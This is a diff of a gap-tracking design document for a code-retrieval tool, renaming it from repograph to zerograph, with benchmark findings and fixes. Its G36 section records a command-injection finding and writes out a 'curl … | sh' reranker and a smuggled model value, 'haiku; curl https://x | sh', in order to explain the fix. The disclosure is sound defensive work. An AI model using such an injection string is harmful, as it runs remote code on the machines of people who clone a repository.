@@ -1,7 +1,7 @@
 # What the 2026-09-03 numbers say is weak
 
 Every item below is a gap the [three-graph run](2026-09-03-three-graphs-results.md)
-measured on repograph 0.4.0, not a wish. Each carries the number that exposed it, the
+measured on zerograph 0.4.0, not a wish. Each carries the number that exposed it, the
 diagnostic that would confirm the cause, the lever, and the gate that would tell us
 it worked. They are ordered by how much of a real answer is missing, not by effort.
 
@@ -9,7 +9,7 @@ Two of them are the language work already scheduled for 0.6.0; what this file ad
 that the bench says they are not a nice-to-have.
 
 Each heading now carries a status line from the 2026-09-04 run
-([`2026-09-04-repograph-0.5.0-results.md`](2026-09-04-repograph-0.5.0-results.md)). Three
+([`2026-09-04-zerograph-0.5.0-results.md`](2026-09-04-zerograph-0.5.0-results.md)). Three
 closed, one was measured and rejected, and two are closed on one half and deferred on the
 other — a gap is not closed because a task ran against it.
 
@@ -42,7 +42,7 @@ raised them are not the run the rest of this file is written against. They have 
 own at the end, for the same reason.
 
 G28 onward are a third family, raised on 2026-09-09 by two pieces of work that share a branch
-([PR #21](https://github.com/devmaxxx/repograph/pull/21)): the first reading of `ask --rerank` on
+([PR #21](https://github.com/devmaxxx/zerograph/pull/21)): the first reading of `ask --rerank` on
 the 82 recorded cases, and the rewrite that took `id_families` out of the configuration and
 derives every family from the definitions the documents carry. The numbers live in
 `bench/history/runs.jsonl` (the rows of that day, tagged `derived-read` and `derived`) and in the
@@ -83,8 +83,8 @@ changed file.
 
 The symbol half is **baseline written; the extractor is 0.6.0's** — 57 of the 61 symbols
 still unnamed are Kotlin declarations, and the remaining 4 are one truth-side
-mis-attribution, not a repograph miss. Numbers and the bucketing:
-[`2026-09-04-repograph-0.5.0-results.md`](2026-09-04-repograph-0.5.0-results.md). The
+mis-attribution, not a zerograph miss. Numbers and the bucketing:
+[`2026-09-04-zerograph-0.5.0-results.md`](2026-09-04-zerograph-0.5.0-results.md). The
 gate's "≥34/38 symbols on the 18-file case" cannot be checked as written: that case's
 want-total grew with the corpus, so the run reads 48/54 at a different HEAD.
 
@@ -157,7 +157,7 @@ paraphrases need a model and the floors stay where the measurement put them.
 
 **The two soft misses are a different bug.** They are coverage, not ranking: the
 target file never entered the pool. Diagnose them with
-`repograph dump --queries` and read the four retriever lists 300 deep. If the target
+`zerograph dump --queries` and read the four retriever lists 300 deep. If the target
 is absent from all four, no reranker will ever help, and the question is what the
 extractor did with that requirement.
 
@@ -178,7 +178,7 @@ them from the truth rather than excluding them in prose, which takes the origina
 targets to 111/111. The fourth was real: `AuthService`'s tenth file imported it through
 a barrel, and Task 4 made a re-exporting barrel an importer. The 0.949 this gap was raised
 on is in [the three-graph results](2026-09-03-three-graphs-results.md); what closed it is in
-[the 0.5.0 gap-closing results](2026-09-04-repograph-0.5.0-results.md).
+[the 0.5.0 gap-closing results](2026-09-04-zerograph-0.5.0-results.md).
 
 ---
 
@@ -190,7 +190,7 @@ spanning small/large and mono/polyglot, `trace` unchanged at 8. The decision rul
 gap asked for is written down in
 [`three-graphs.md`](three-graphs.md#when-a-blast-delta-counts), per suite, with a noise
 column — stated before the changes above were measured against it. Numbers:
-[the 0.5.0 gap-closing results](2026-09-04-repograph-0.5.0-results.md).
+[the 0.5.0 gap-closing results](2026-09-04-zerograph-0.5.0-results.md).
 
 ---
 
@@ -203,7 +203,7 @@ unmeetable: the 2026-09-03 rows cannot be rescored, because the harness stored c
 and never the answer text, so the field starts here with no prior value. The paraphrase
 row also answers the question this gap was raised to serve — reordering cannot produce
 the 14 ids that are absent, and finding them would not by itself put them first. Numbers:
-[the 0.5.0 gap-closing results](2026-09-04-repograph-0.5.0-results.md).
+[the 0.5.0 gap-closing results](2026-09-04-zerograph-0.5.0-results.md).
 
 ---
 
@@ -220,15 +220,15 @@ sections, each re-read on the release candidate (`4dd1bf1`) with its default glo
 | Java | private | pass | pass | pass | waived | pass |
 | C# | private | pass | pass | pass | pass | pass |
 | Razor | private | pass | pass | **fail** | **fail** | pass |
-| Rust | `repograph`, `agent-orchestrator` | pass | pass | pass | pass | pass |
-| Python | `repograph`; private | pass | pass | pass; waived on the private corpus | pass; waived on the private corpus | pass |
+| Rust | `zerograph`, `agent-orchestrator` | pass | pass | pass | pass | pass |
+| Python | `zerograph`; private | pass | pass | pass; waived on the private corpus | pass; waived on the private corpus | pass |
 | Dart | `pawfice` | pass | pass | pass | pass | pass |
 | Swift | `pawfice` | pass | pass | waived | waived | waived |
 | GraphQL | private | pass | pass | pass | pass | pass |
 | SQL | `beauty-crm-sql` | pass | pass | pass | pass | pass |
 | Bicep | private | pass | pass | pass | pass | pass |
 | HCL | `beauty-crm-hcl` | pass | pass | pass | pass | pass |
-| Shell | `repograph`; private | pass | pass | pass | pass; waived on the private corpus | pass |
+| Shell | `zerograph`; private | pass | pass | pass | pass; waived on the private corpus | pass |
 | Vue | private | pass | pass | pass | waived | pass |
 
 The waivers, each a case the corpus cannot hold, ruled by Max on 2026-10-03 (Java, Python, Shell)
@@ -255,7 +255,7 @@ was built; the retrieval half was not attempted either, because it needs that co
 own `id_families` census. Second corpus, second language, still one id census.
 
 **Measured, structurally.** All 102 cases are `beauty-crm`. All 30 paraphrases are
-Russian. `repograph.toml` says of its own `id_families` list: "This is beauty-crm's
+Russian. `zerograph.toml` says of its own `id_families` list: "This is beauty-crm's
 census, not a generic default; a different repository should list its own families."
 Nothing in the suite measures the tool on a repository it was not tuned against.
 
@@ -280,7 +280,7 @@ one `changes` case in its own corpus, and a result file beside this one.
 store on the configuration it actually is
 ([ADR-001 Amendment 5](../adr/ADR-001-paraphrase-recall-was-a-prediction.md)): the enriched
 lexical-only arm read `keyword 37/40` against the raw store's `39/40` on the same corpus, missing
-`FR-WH-53` and `W-206` that the raw store answered, and `repograph bench --no-dense` exited 1.
+`FR-WH-53` and `W-206` that the raw store answered, and `zerograph bench --no-dense` exited 1.
 
 **Closed by** the per-question gate on the generated-questions list described in
 [ADR-001 Amendment 6](../adr/ADR-001-paraphrase-recall-was-a-prediction.md): the list joins the
@@ -441,7 +441,7 @@ questions for the target are near-synonyms of the query — «Где лежит 
 `multilingual-e5-small`'s distance between two Russian paraphrases, and no fusion rule repairs it.
 The first amendment measured `e5-base` and `bge-m3` on fourteen cases without generated questions
 and found no gain; neither was measured with the question rows in the index, which is where a
-stronger model would show. Lever: `REPOGRAPH_EMBED_MODEL` re-embeds a store copy under another
+stronger model would show. Lever: `ZEROGRAPH_EMBED_MODEL` re-embeds a store copy under another
 hub model; `multilingual-e5-large` is the one measured in the results document. Gate: the same
 three-way rule, dense arms only, plus query latency under a second.
 
@@ -450,7 +450,7 @@ three-way rule, dense arms only, plus query latency under a second.
 the small model's 15/30 — seven of the fifteen misses — with keyword 40/40, code 12/12, p90 224,
 the developer suite 37/60 and held-out 103 → 119 of 400 (+19 −3, p = 0.0009): the whole three-way
 rule, in the arm it applies to, and query latency still under a second. It ships as a property of
-the store — `embed_model` in `repograph.toml`, recorded in `vectors.json`, opened by every reader —
+the store — `embed_model` in `zerograph.toml`, recorded in `vectors.json`, opened by every reader —
 and the default moved to it at `35357c1`; `UNNAMED_MODEL` keeps a store with no recorded model
 reading as the small one, so an older store never silently reinterprets under the new default. The
 cost of that default is measured in [Embeddings](../embeddings.md). Nothing here reaches
@@ -653,7 +653,7 @@ not the next step — opus only if a kind-aware sonnet still falls short.
 **Gate.** `rule` back to 5/9 or better in both arms with the paraphrase and held-out gains kept, and
 the recorded floors held. Until then `ENRICH_COMMAND` stays haiku; `enrich_command` is per-store
 configuration, so a store that wants sonnet's paraphrase recall today can have it in one line of
-`repograph.toml`, at roughly five times the token cost.
+`zerograph.toml`, at roughly five times the token cost.
 
 **Status (2026-09-05, 0.5.0): the stated cause is measured and does not hold; the gap stays open.**
 The free diagnostic this gap asked for was run and stopped the lever before any prompt was written
@@ -1222,7 +1222,7 @@ this family is read through these bars.
 tests over it. *n* runs and a median: `judge.py` refuses a row built from fewer than five runs, and
 refuses one whose transcript says the measured command failed. The precondition is a script rather
 than a sentence: `quiet.sh` requires ≥ 85% idle, a 1-minute load under 3.0, AC power, no `cargo`,
-`rustc` or other `repograph` at any CPU, and no `node` at or above 5% CPU outside its own ancestor
+`rustc` or other `zerograph` at any CPU, and no `node` at or above 5% CPU outside its own ancestor
 chain — presence alone is not noise, and an idle sibling harness is not what spoiled a row. The
 pinned index is the fixture's store copied into the one writable worktree by `reset.sh`, every row
 `--stale`, with `shasum` over the store before and after both suites to say that nothing wrote.
@@ -1361,7 +1361,7 @@ first one after a drop — the open, paid where the gate said to state it — an
 identical across the drop. The warm number is what the hook's 5 s budget is measured against, which
 is why `agent/hook.mjs` now starts a `serve --idle 1800 --idle-model 300` on `SessionStart`: no
 probe first, because a second `serve` refuses to bind while one answers and leaves by itself, so
-the start is the check. `REPOGRAPH_HOOK_SERVE=0` turns it off.
+the start is the check. `ZEROGRAPH_HOOK_SERVE=0` turns it off.
 
 ## G27 · `serve` cannot bind under a deep path, and a killed one leaves its socket behind — closed 2026-09-09
 
@@ -1370,7 +1370,7 @@ the start is the check. `REPOGRAPH_HOOK_SERVE=0` turns it off.
 than costs — neither appears in any table of either round — and they are written as a gap because
 this file is where the open items live.
 
-**Measured.** `<repo>/.repograph/serve.sock` over `SUN_LEN`, 104 bytes on macOS, cannot be bound,
+**Measured.** `<repo>/.zerograph/serve.sock` over `SUN_LEN`, 104 bytes on macOS, cannot be bound,
 so a repository under a deep path cannot use `serve` at all — including every store copy these two
 rounds worked on, which lived under `/private/tmp/…`. The error names the cause, which is the good
 half of it. Separately, a `serve` killed with `SIGTERM` leaves `serve.sock` behind: the unlink is a
@@ -1383,11 +1383,11 @@ of the canonical repository path, or state the limit in the README so the failur
 the stale socket, a signal handler that unlinks, or nothing at all and a sentence saying why
 nothing is needed.
 
-**Gate.** `serve` binds and answers from a repository whose `.repograph` path is longer than 104
+**Gate.** `serve` binds and answers from a repository whose `.zerograph` path is longer than 104
 bytes; a `SIGTERM`ed `serve` leaves no `serve.sock`, or the README says why one is left.
 
-**Closed (2026-09-09), both halves.** `socket_path` returns `.repograph/serve.sock` while that name
-is at most 100 bytes and `$TMPDIR/repograph-<16 hex of the canonical repository path>.sock`
+**Closed (2026-09-09), both halves.** `socket_path` returns `.zerograph/serve.sock` while that name
+is at most 100 bytes and `$TMPDIR/zerograph-<16 hex of the canonical repository path>.sock`
 otherwise — one function, so a client cannot take a fallback the server did not. 100 rather than 104
 is one margin on every platform. Proved on a 230-byte repository path: `build`, `serve`, and an
 `ask` answered `by the resident process`, where before the bind itself failed.
@@ -1550,7 +1550,7 @@ rebuild, enrich the 150, read all four arms before and after.
 rebuild is a recorded before/after pair with coverage ≥ 99% after `enrich`.
 
 **Half closed (2026-09-09).** `build` and `update` print `N requirement-like nodes have no questions
-— run \`repograph enrich\`` whenever the store carries questions for some others; a store nobody
+— run \`zerograph enrich\`` whenever the store carries questions for some others; a store nobody
 enriched prints nothing, which is the state rather than a next step (`enrich::unenriched_note`, one
 test over the three cases). The README's Embeddings section says a rebuild under new families is
 followed by `enrich`. The fixture half — rebuild, enrich the 150, read all four arms before and
@@ -1629,7 +1629,7 @@ set before it decides whether anything must be re-extracted. On 908 files that i
 milliseconds inside a 1.9 s walk; expected is not measured, and the resource rounds' tables have
 no row for it.
 
-**Lever.** A `derive` stage on the `REPOGRAPH_TIMING` line, read once on the corpus in the
+**Lever.** A `derive` stage on the `ZEROGRAPH_TIMING` line, read once on the corpus in the
 foreground and once in the band.
 
 **Gate.** A number in the resource results beside the walk's, under the walk's own.
@@ -1638,7 +1638,7 @@ foreground and once in the band.
 altogether, and gave the build and poll paths a scan that does not tally mentions nobody reads. A
 cold no-op went 1.00 s → 0.08 s and a warm one 0.10 s → 0.06 s. That is the shape of the cost, not
 the number the gap asks for: an `update` that does change a file still derives over the whole
-corpus, and the `REPOGRAPH_TIMING` line still has no `derive` stage.
+corpus, and the `ZEROGRAPH_TIMING` line still has no `derive` stage.
 
 **Moot 2026-09-11.** There is no derivation stage left to time. Since #27 no writer derives a
 family set at all — the extractor reads one generic id grammar and `families::of_graph` is a view
@@ -1649,12 +1649,12 @@ exists). §3's gate asks for a number on a stage that was removed rather than me
 
 ---
 
-## G36 · A repository's `repograph.toml` runs any shell command on the machine that reads it
+## G36 · A repository's `zerograph.toml` runs any shell command on the machine that reads it
 
 **Raised (2026-09-09)** while writing down the vendor-neutral command contract. `enrich_command`
 and `rerank_command` are read from the project file, run under `sh -c`, and the project's key wins
 over the machine's — «what the file says is what that repository asked for». A cloned repository
-is untrusted input, and its `repograph.toml` can name `curl … | sh` as the reranker; the first
+is untrusted input, and its `zerograph.toml` can name `curl … | sh` as the reranker; the first
 `ask --rerank` or `enrich` on that clone runs it, with the prompt on stdin and nothing printed
 first. The same contract sends 200 candidates' titles and 120 characters each to whatever the
 command is — opt-in and documented, but the command deciding where that text goes is the
@@ -1667,7 +1667,7 @@ reading the layering rules, not by a run. No recorded corpus abuses it.
 `rerank_model` and not the `*_command` keys, which come from the machine file or the built-in
 (the model is a property of the corpus in name only; the transport never was); or a command the
 project file names is printed and refused until the machine file, or a per-repository trust line
-under `~/.config/repograph`, allows it by hash; or the built-in is the only transport and the
+under `~/.config/zerograph`, allows it by hash; or the built-in is the only transport and the
 rest is a documented environment variable. The first removes the surface with one refused key,
 the way the machine file already refuses `embed_model`.
 
@@ -1679,7 +1679,7 @@ not close this gap on its own, because the model name is interpolated into the c
 The built-in template is `… claude -p --model {model} --output-format text …`, and `Config::load`
 ends with `enrich_command = template.replace("{model}", &cfg.enrich_model)` — with `enrich_model` a
 key the project file may set, and the result handed to `sh -c`. A cloned repository whose
-`repograph.toml` says `enrich_model = "haiku; curl https://x | sh"` therefore runs that on the first
+`zerograph.toml` says `enrich_model = "haiku; curl https://x | sh"` therefore runs that on the first
 `enrich` **after** the command keys are refused. The name is a token by contract and was never
 checked to be one; a gap that closes one of two doors is not closed.
 
@@ -1690,7 +1690,7 @@ they came from, project file, machine file or environment alike:
 `[A-Za-z0-9][A-Za-z0-9._:/@+-]{0,127}`, anything else refused with the built-in name used instead.
 Four tests in `src/config.rs`; two existing tests that pinned a project-supplied command were moved
 onto the machine file, which is the behaviour change stated as a test rather than discovered as one.
-The repository's own `repograph.toml` no longer names either command. No path `bench` reads passes
+The repository's own `zerograph.toml` no longer names either command. No path `bench` reads passes
 through either key unless `--rerank` is given, which the recorded arms do not give, so no floor moved
 and none was re-run.
 
@@ -1836,7 +1836,7 @@ change it asked for.
 
 ## G41 · A verdict that is an answer exits like a crash — `bench` and `trace` — closed 2026-09-11
 
-**Raised (2026-09-11)** by the reader suite, which has to time `repograph bench` and cannot tell a
+**Raised (2026-09-11)** by the reader suite, which has to time `zerograph bench` and cannot tell a
 verdict from a crash.
 
 **Measured.** A missed floor is `anyhow::bail!("bench floors not met")` at `src/main.rs:742` —
@@ -1874,9 +1874,9 @@ without the harness having to know which answer it got.
 and the README states the codes for both commands where it already states the summary line.
 
 **Closed 2026-09-11.** The lever as written — "`2`, or whatever does not collide" — at **`3`**,
-because `2` collides twice. `clap` exits 2 on a usage error, so `repograph bench --nosuchflag`
+because `2` collides twice. `clap` exits 2 on a usage error, so `zerograph bench --nosuchflag`
 would be indistinguishable from a suite that ran and missed a floor; and
-`npm/repograph/bin/repograph.js` exits 2 when no platform binary is installed, which CI pins. A
+`npm/zerograph/bin/zerograph.js` exits 2 when no platform binary is installed, which CI pins. A
 verdict has to be a status no layer above the command writes.
 
 `main` returns an `ExitCode` and delegates to `run`; the two sites that answer a question with "no"
@@ -1907,7 +1907,7 @@ so about two seconds a sample. Every reader row is shorter than that: `impact` a
 `ask-fused` at 0.35–0.58, `dump10` at 0.70–0.90, `bench-dense` at 1.47–1.90. They all report
 `peak_cpu = 0`, and `compare` carries a zero reference as "never sampled" and leaves the column
 unjudged. The only row long enough to be read is the whole-store embed, ~1,930 s, which is the one
-`REPOGRAPH_TIMING`-shaped number G19's gate names. So the peak-CPU column exists, is tested, and is
+`ZEROGRAPH_TIMING`-shaped number G19's gate names. So the peak-CPU column exists, is tested, and is
 readable for exactly one of eleven rows.
 
 **Lever.** Two, and the cheap one needs no sampler at all: `/usr/bin/time -l` already reports user
@@ -2000,7 +2000,7 @@ answer different questions, and no row below moves a retrieval floor.
 | 3 | **G19** the progress cadence is a count of rows | **unread 2026-10-03 (0.6.0)**: §9 of the levers results is empty. A fixed bar the plan set and the shipped code misses at both tails, 102.4 s and 96.7 s against 60, with the batching rule that would fix it already written one file away |
 | 4 | **G22** mapped weights under memory pressure | a shipped default whose price is +6% to +26% of wall exactly on the machines that most need the 1.14 GB it saves, and all three candidate policies are unmeasured |
 | 5 | ~~**G21** one platform measured, three reasoned~~ | ~~the largest unmeasured surface in the family, and the one that needs hardware this session did not have~~ — closed 2026-09-09 — the band was removed |
-| — | ~~**G27** `serve`'s socket path and its leftover~~ | closed 2026-09-09 — the socket falls back to `$TMPDIR/repograph-<hash>.sock` when `.repograph/serve.sock` will not fit in `sun_path`, proved on a 230-byte repository path that could not bind at all before; and a `SIGTERM` sets a flag the loop reads, so the exit is the identity-checked one every other exit takes |
+| — | ~~**G27** `serve`'s socket path and its leftover~~ | closed 2026-09-09 — the socket falls back to `$TMPDIR/zerograph-<hash>.sock` when `.zerograph/serve.sock` will not fit in `sun_path`, proved on a 230-byte repository path that could not bind at all before; and a `SIGTERM` sets a flag the loop reads, so the exit is the identity-checked one every other exit takes |
 | ~~7~~ | ~~**G26** `serve` holds its model while idle~~ | **closed 2026-09-09** — `--idle-model`, default 300 s: 908.5 MB → 28.8 MB on the first drop, 277.6 MB on the second, 0.771 s for the ask that pays the open |
 | 8 | **G25** the fp32 weights are the floor | the only lever that could move the floor under every memory number in both rounds, and finding out costs a full re-embed and the quantized model's own floors — no download at all on the default, whose int8 build is already cached, and the large model is no longer compared (2026-09-11) |
 | 9 | **G24** `--rerank-local` is 31.9 s and 3.1 GB | the heaviest reader by far, and what would actually move it is a pool depth, which belongs to G2 and not to this family |
